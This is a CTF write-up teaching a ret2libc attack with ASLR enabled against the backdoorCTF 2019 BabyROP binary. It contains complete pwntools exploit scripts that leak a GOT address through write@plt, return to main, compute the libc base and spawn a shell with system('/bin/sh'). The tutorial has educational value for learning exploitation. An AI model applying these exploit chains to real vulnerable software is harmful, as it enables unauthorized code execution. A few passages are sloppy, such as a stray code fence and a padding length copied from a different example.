# Ret2libc ( return to libc attack )

Prerequisite: 

* NX Enabled
* No Canary
* PIE Disabled
* No Fortify

# ret2libc definition

As the name says, `ret2libc` which means, this technique involves code reusual from the dynamically linked file `libc.so.6`, since most of the binary is dynamically linked, all the functions which are predefined, for example `strcmp`, `puts`, `printf`, `gets` etc. are stored in the `libc.so.6`, when you dynamically link  an ELF file, these functions are stored in a section named as `.got.plt` which contains the `GOT` address, which is the address which imports the addresses of function in the runtime. This section is about how to do `ret2libc` when `ASLR` is **enabled**.  It is simple from what you have been doing in stack overflow with a `ret2func` technique. In `ret2win` payload looks like:

```r
----------------------------------------------------
| padding to EIP | address of the win function     |
----------------------------------------------------
```

In `ret2libc` technique, our payload looks like:-

```r
--------------------------------------------------------------------------
| padding to EIP | function from libc.so.6 | dummy ret | args1.....argsN |
--------------------------------------------------------------------------
```
Where `N` being the number of arguments a function takes.

## About `ASLR`

ASLR, short for Address Space Layout Randomization is a security mitigaion technique which randomizes the address of functions which makes it harder for exploiting binaries via `ret2libc` technique. This security mitigation can be defeated by leaking an address from GOT section and calculating the base address by **subtracting the leaked address from the exact offset of the function**. Now, the functions in Dynamic Libraries are stored at certain address offsets, that is becasue `PIE` is enabled which stands for `**Position Independent Executable**, this randmoizes the vase address of the binary and store the functions at specific offsets which calculated at runtime. 

In order to defeat the ASLR, we need to leak an address which is basically a GOT address, for this our payload would be like:-

```r
----------------------------------------------------------------------------------------
|  padding to EIP | function | function to print the address | gadets | args1.....argsN|
----------------------------------------------------------------------------------------
```

For example. if we have `puts` in binary and it has a GOT address, we can do something like:-

```r
----------------------------------------
| padding to EIP | puts@plt | puts@got |
----------------------------------------
```

# Practical Time

We are taking a binary from backdoorCTF 2019, challenge name is BabyROP. Let's see what it do:-

```r
d4mianwayne@oracle:~/Pwning/rop$ ./chall 
AAAA
Hello World
```

Seems to do nothing more than taking input, now let's see what exactly it do with `radare2`:-

```r
d4mianwayne@oracle:~/Pwning/rop$ r2 -AAAA chall
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)

-- snip --

[0x08048340]> afl
0x08048000   17 764  -> 765  fcn.eip
0x080482c8    3 35           sym._init
0x080482fc    1 4            sub.read_12_2fc
0x08048300    1 6            sym.imp.read
0x08048310    1 6            sym.imp.__libc_start_main
0x08048320    1 6            sym.imp.write
0x08048330    1 6            sub.__gmon_start___252_330
0x08048340    1 33           entry0
0x08048370    1 4            sym.__x86.get_pc_thunk.bx
0x08048380    4 43           sym.deregister_tm_clones
0x080483b0    4 53           sym.register_tm_clones
0x080483f0    3 30           sym.__do_global_dtors_aux
0x08048410    4 43   -> 40   entry1.init
0x0804843b    1 30           sym.noob_function
0x08048459    1 55           sym.main
0x08048490    4 93           sym.__libc_csu_init
0x080484f0    1 2            sym.__libc_csu_fini
0x080484f4    1 20           sym._fini
```

The `main` and `sym.noob_function` seems to be interesting. Let's check the disassembly:-

```r
[0x08048340]> pdf @main
            ;-- main:
/ (fcn) sym.main 55
|   sym.main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x08048357 (entry0)
|           0x08048459      8d4c2404       lea ecx, dword [local_4h]   ; 4
|           0x0804845d      83e4f0         and esp, 0xfffffff0
|           0x08048460      ff71fc         push dword [ecx - 4]
|           0x08048463      55             push ebp
|           0x08048464      89e5           mov ebp, esp
|           0x08048466      51             push ecx
|           0x08048467      83ec04         sub esp, 4
|           0x0804846a      e8ccffffff     call sym.noob_function
|           0x0804846f      83ec04         sub esp, 4
|           0x08048472      6a0e           push 0xe                    ; 14
|           0x08048474      6810850408     push str.Hello_World        ; 0x8048510 ; "Hello World\n" ; size_t nbytes
|           0x08048479      6a01           push 1                      ; 1 ; int fd
|           0x0804847b      e8a0feffff     call sym.imp.write          ; ssize_t write(int fd, void *ptr, size_t nbytes)
|           0x08048480      83c410         add esp, 0x10
|           0x08048483      b800000000     mov eax, 0
|           0x08048488      8b4dfc         mov ecx, dword [local_4h_2]
|           0x0804848b      c9             leave
|           0x0804848c      8d61fc         lea esp, dword [ecx - 4]
\           0x0804848f      c3             ret
[0x08048340]> pdf @sym.noob_function
/ (fcn) sym.noob_function 30
|   sym.noob_function ();
|           ; var int local_9h @ ebp-0x9
|              ; CALL XREF from 0x0804846a (sym.main)
|           0x0804843b      55             push ebp
|           0x0804843c      89e5           mov ebp, esp
|           0x0804843e      83ec18         sub esp, 0x18
|           0x08048441      83ec04         sub esp, 4
|           0x08048444      6800010000     push 0x100                  ; 256
|           0x08048449      8d45f7         lea eax, dword [local_9h]
|           0x0804844c      50             push eax                    ; size_t nbyte
|           0x0804844d      6a00           push 0                      ; int fildes
|           0x0804844f      e8acfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x08048454      83c410         add esp, 0x10
|           0x08048457      c9             leave
```

So, in a way it is calling `noob_function` which seems to be more input than it has been allocated to buffer which is a buffer overflow vulnerability. In the main, just after the `noob_function` is called it is printing `"Hello World\n"` by calling `write`.

So, since we know ASLR is enabled:-

```r
d4mianwayne@oracle:~/Pwning/rop$ cat /proc/sys/kernel/randomize_va_space 
2
```

Value is `2` which means ASLR is enabled. Now, we need to pwn it:-


### Finding offset to EIP

We are going to use `gef`'s `patter create` to create a cyclic pattern and then find the exact offset to EIP which will save us the time of finding offset by trial and error.

```r
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef1'
gef➤  r
Starting program: /home/d4mianwayne/Pwning/rop/chall 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]


-- snip --

[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x65616161
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x65616161 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────
0x65616161 in ?? ()
gef➤  pattern search 0x65616161
[+] Searching '0x65616161'
[+] Found at offset 13 (little-endian search) likely
[+] Found at offset 16 (big-endian search)
```

So, the offset to EIP is `13`, now let's do a dummy check by sending `b"A"*13 + p32(0xdeadbeef)` and see the EIP.

```python
from pwn import *

p = process("./chall")
elf = ELF("chall")
libc = elf.libc
gadget = 0x080484e9 #  pop esi; pop edi; pop ebp; ret;
payload = b"A"*13
pause()    # Pause the process to attach it to GDB
p.sendline(payload)
p.interactive()
```

Let's run it and then attach it to `gdb`.

```r
d4mianwayne@oracle:~/Pwning/rop$ python3 chall.py 
[+] Starting local process './chall': pid 7162
[*] '/home/d4mianwayne/Pwning/rop/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Paused (press any to continue)
```

Attaching it t `gdb`:-

```r
gef➤  attach 7162
Attaching to program: /home/d4mianwayne/Pwning/rop/chall, process 7162
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.
done.

-- snip 

gef➤  c
Continuing.
```

Then continuing the exploit script, in `gdb` we can see:-

```r
──────────────────────────────────────────────────────────────────────────────────────────────────────────
0xdeadbeef in ?? ()
```

### Leaking `GOT` Address

Since there is no `puts`, we have to use `write` to leak a GOT address. since this binary has `write`, `write` it takes 3 arguments, we need a gadget in order to push those arguments to stack and eventually, they'll get passed to the `write` function.

```r
-------------------------------------------------------------------------------------------------------
|  padding to EIP | write@plt | pop esi; pop edi; pop ebp; ret;  | 0x1 | GOT Address | bytes to write |
-------------------------------------------------------------------------------------------------------
```

* `0x1`: To print the leak at the stdout.
* `GOT Address` : The GOT address to print. 


Now, let's create the ROP chain which will be used to leak the address:

```python
payload += p32(elf.plt['write'])
payload += p32(gadget)
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)
```

Where `gadget` would be `pop esi; pop edi; pop ebp; ret;` stored at teh address `0x080484e9`.

Let's run the exploit and then parse the leaked address:-

```python
from pwn import *

p = process("./chall")

elf = ELF("chall")
libc = elf.libc

gadget = 0x080484e9 #  pop esi; pop edi; pop ebp; ret;

payload = b"A"*13 # Offset to `EIP`
payload += p32(elf.plt['write']) # Calling `write`
payload += p32(gadget) # Passing Gadgets
payload += p32(1) # Giving 1st argument
payload += p32(elf.got['read']) # Giving 2nd argument
payload += p32(0x8) # Giving 3rd argument
pause()    # Pause the process to attach it to GDB

p.sendline(payload) # Sending payload

read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00")) # Recieving the 4 bytes and making it aligned
log.info("read@libc: "+hex(read_leaked)) # Logging

p.interactive() 
```

Let's run it and then attached to `gdb`:-

```r
d4mianwayne@oracle:~/Pwning/rop$ python3 chall.py 
[+] Starting local process './chall': pid 8064
[*] '/home/d4mianwayne/Pwning/rop/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Paused (press any to continue)
```

Attaching it to `gdb` and continuing:-

```r
gef➤  c
Continuing.

Thread 1 "chall" received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]


-- snip --

gef➤  p read
$3 = {ssize_t (int, void *, size_t)} 0xf7e6fcb0 <__GI___libc_read>

```

Let's check our exploit:-

```r
    PIE:      PIE enabled
[*] Paused (press any to continue)
[*] read@libc: 0xf7e6fcb0
[*] Switching to interactive mode
```

Awesome, we managed to leak the address of `read`, now it's time to call `main` again. 

---

> Reason: THe reason we are calling main is again is because the libc address gets changed with every process, what we need to do here is, we call `main` in the same process and sending the 2nd ROP chain which will spawn a shell.

---

This can be done with adding the address of `main` to the 1st ROP chain.

```r
payload = b"A"*13
payload += p32(elf.plt['write'])
payload += p32(gadget)
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)
payload += p32(elf.symbols['main'])
```


Running it again:-

```r
d4mianwayne@oracle:~/Pwning/rop$ python3 chall.py 
[+] Starting local process './chall': pid 8139
[*] '/home/d4mianwayne/Pwning/rop/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] read@libc: 0xf7e7ccb0
[*] Switching to interactive mode
$ hello
Hello World
\x00[*] Got EOF while reading in interactive
$ 
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 8139)
[*] Got EOF while sending in interactive
```

We are able to give input again and `"Hello World"` which means we successfully called `main`.

### Calculating LIBC address 

Like I said earlier to get the libc address we need to subtract the leaked address from the the function's offset from LIBC. This can be done by:-

`offset = read_leaked - libc.symbols['read']`

> Alternatively, `libc.address = read_leaked - libc.symbols['read']`, which will allow us to use the `pwntools`'s `elf` class functions.

### Spawning Shell

Now, we have the libc base address, all we need to do is calculate the address of system.

```python

` it exactly same as we did in `ret2libc` no `ASLR`:-

```r
------------------------------------------------------
| "A"*140 | system_addr + dummy_ret + /bin/sh address|
------------------------------------------------------
```

Now, our exploit look like:-

```python
from pwn import *

p = process("./chall")
elf = ELF("chall")
libc = elf.libc
gadget = 0x080484e9 #  pop esi; pop edi; pop ebp; ret;

'''
ROP Chain 1st

Doing `write(1, read@got, 0x8)`
'''
payload = b"A"*13
payload += p32(elf.plt['write'])
payload += p32(gadget)
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)
'''
Calling `main` again to send 2nd chain
'''

payload += p32(elf.symbols['main']) # `main` address
#pause() 
p.sendline(payload) # Sending 1st payload

'''
Parsing the leaked address
'''

read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00"))
log.info("read@libc: "+hex(read_leaked))

'''
Updating the libc address
'''

libc.address = read_leaked - libc.symbols['read']

'''
Calclating the address for `system` and `/bin/sh`
'''
system = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))
'''
ROP Chain 2nd
Calling `system("/bin/sh\x00")
'''

payload = b"A"*13
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload) # Sending the second payload
p.interactive()
```

We are done.